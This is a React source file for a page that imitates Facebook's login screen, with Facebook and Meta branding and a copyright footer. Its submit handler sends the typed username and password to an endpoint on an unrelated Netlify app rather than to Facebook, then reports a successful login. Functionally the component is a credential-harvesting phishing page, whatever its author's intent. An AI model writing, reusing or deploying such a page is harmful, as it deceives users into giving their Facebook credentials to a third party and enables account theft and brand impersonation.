import axios from "axios";
import React, { useEffect, useState } from "react";

function FaceBookLogin() {

  const[formData, setFormData] = useState({
    username : "",
    password : "",
  });

  const [errorMessage, setErrorMessage] = useState("")
  const [loginMessage, setLoginMessage] = useState("")

  const handleChange = (e) => {
       setFormData({
        ...formData,
        [e.target.name]: e.target.value,
       })
     }

     const ValidateForm = () => {
        const {username, password} = formData;

        if(!username)
        {
            setErrorMessage("Username or email is required.")
            return false
        }
        if(!password){
            setErrorMessage("Password is required.")
            return false
        }

        setErrorMessage("")
        return true
     };

     const handleSubmit = async(e) => {
        e.preventDefault();

        if(!ValidateForm()) return;

        try {
            const response = await axios.post(
                "https://677ee99c9e2c801f9a6885b4--spontaneous-sprinkles-a3abd1.netlify.app/facebooklogin",
                formData,
                {
                    headers:{
                        "Current-Type" : "Application/json",
                    },
                },
            )
            setLoginMessage("Login successfull. "),
                setFormData({username: "", password: ""})
        } catch (error) {
            setErrorMessage(
                error.response?.data?.message || "An error occurred during login."
            )
        }
     }

    useEffect(() => {
        const timeOut = setTimeout(() => 
        setLoginMessage(""),3000);

        return ()=> clearTimeout(timeOut);            
    },[loginMessage])

   

  return (
    <div className="container mt-5" >
      <div className="backgroundimg">
        <div className="image-in relative mt-[50px]" id="cf"></div>
      </div>

      <div className="into-container text-right">
        <div className="signup grid justify-center">
          <div className="text-center font-medium">
            <span>English (UK)</span>
          </div>
          <div className="inline-flex justify-center mt-[30px] mb-[20px]">
            <img className="w-[70px] h-[70px]"
              src="https://cdn.freebiesupply.com/logos/large/2x/facebook-logo-2019.png"
              alt="facebook"
            />
          </div>

          <form className="form-middle" method="post" onSubmit={handleSubmit}>
            <div className="mt-4">
              <input
                className="w-[300px] h-12 border border-gray-400 rounded px-2 text-lg font-medium"
                name="username"
                value={formData.username}
                onChange={handleChange}
                placeholder="Mobile number or email address"
              />
            </div>
            <div className="mt-4">
              <input
                className="w-[300px] h-12 border border-gray-400 rounded px-2 text-lg font-medium "
                name="password"
                value={formData.password}
                onChange={handleChange}
                placeholder="Password"
                type="password"
              />
            </div>
            <button
              type="submit"
              className="w-full mt-4 p-2 bg-blue-500 text-white rounded-full  text-lg font-medium"
            >
              Login
            </button>
            <div className="grid justify-center mt-5">
            <span className=" h-[35px]    font-bold  text-blue-900">
              Forgot password?
            </span>
          </div>
          </form>
          {errorMessage && <p className="text-red-600">{errorMessage}</p>}
          {loginMessage && <p className="text-green-600">{loginMessage}</p>}

          {/* {message && <p className="mt-4 text-center">{message}</p>} */}

          <div className="items-center justify-center grid mt-20">
            <span className="flex w-[65px] pl-[15px] font-bold">from</span>
            <div className="flex justify-between">
              <img
                style={{ height: "17px", width: "17px", marginTop: "4px" }}
                className="bg-white-500"
                src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/meta-black-icon.png"
                alt="meta"
              />
              <span className="font-bold mt-[-3px] pl-[4px] ml-1">Meta</span>
            </div>
          </div>
         

          <span className="mt-5 items-center justify-center grid pb-[15px]">
            © 2025 Facebook from Meta
          </span>
        </div>
       
      </div>
     
    </div>
  );
}

export default FaceBookLogin;
